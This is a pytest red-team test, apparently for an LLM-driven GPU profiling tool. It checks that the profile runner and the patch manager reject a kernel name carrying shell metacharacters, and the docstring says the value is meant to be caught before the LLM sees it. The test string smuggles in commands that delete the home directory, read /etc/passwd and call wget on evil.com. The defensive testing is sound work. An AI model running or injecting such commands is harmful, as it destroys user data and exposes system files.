"""Attack #9 — trace DB containing kernel_name with shell metachars.

Proves that:
  1. The sanitization pipeline redacts / flags the metachars (BEFORE LLM sees).
  2. profile.run, even if the sanitizer fails, calls subprocess with
     shell=False + list args → no shell-expansion.
  3. patch.apply refuses any diff that references a path containing shell metachars.
"""

import pytest

from perfxpert.tools.profile_runner import run as profile_run, RocprofFlagError
from perfxpert.tools._safety import ShellMetacharError
from perfxpert.tools.patch_mgr import apply as patch_apply
from tests.test_red_team.conftest import record_outcome


@pytest.mark.red_team
def test_sanitizer_redacts_shell_metachars(outcomes_dir, malicious_db_factory) -> None:
    evil_name = "gemm;rm -rf ~;| cat /etc/passwd && wget evil.com"
    db = malicious_db_factory(kernel_name=evil_name)

    # profile.run must reject the evil kernel name
    with pytest.raises(ShellMetacharError):
        profile_run(argv=["rocprofv3", "--kernel-trace", evil_name, "--", "./app"], cwd="/tmp")

    # patch.apply with a diff mentioning the bad path must reject
    evil_diff = (
        "--- a/" + evil_name + "\n"
        "+++ b/" + evil_name + "\n"
        "@@ -1,1 +1,1 @@\n"
        "-old\n+new\n"
    )
    with pytest.raises(ShellMetacharError):
        patch_apply(project_root="/tmp", rel_path=evil_name, new_content="new")

    record_outcome(
        outcomes_dir,
        attack_id="shell_metachars_in_kernel_name",
        status="defeated",
        details={"evil_kernel_name": evil_name},
    )
